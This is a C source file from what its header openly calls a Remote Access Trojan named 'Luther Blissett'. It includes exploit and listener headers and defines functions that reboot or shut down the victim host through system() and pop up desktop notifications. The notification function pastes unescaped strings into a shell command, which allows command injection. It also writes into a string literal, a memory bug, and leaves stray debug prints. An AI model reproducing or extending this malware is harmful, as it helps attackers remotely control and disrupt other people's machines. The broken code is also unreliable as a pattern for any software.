/*
 *  Luther Blissett  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissett is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissett is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdalign.h>
#include <regex.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <sys/mount.h>
#include <linux/loop.h>
#include <fcntl.h>
#include <netinet/in.h>

#include <logs/slog.h>
#include <errors/errors.h>
#include <server/server.h>
#include <server/listener.h>
#include <exploits/help.h>

char logs[1024];

void lb_reboot()
{
    system("reboot");
}

void lb_shutdown() {
    system("shutdown -r now");
}

void lb_notify(char *notifyTitle, char *notifyDescription) {
    char *notifyCommand = "";

            printf("2");
    sprintf(notifyCommand, "notify-send \"%s\" \"%s\" ", notifyTitle, notifyDescription);

            printf("3");
    system(notifyCommand);
}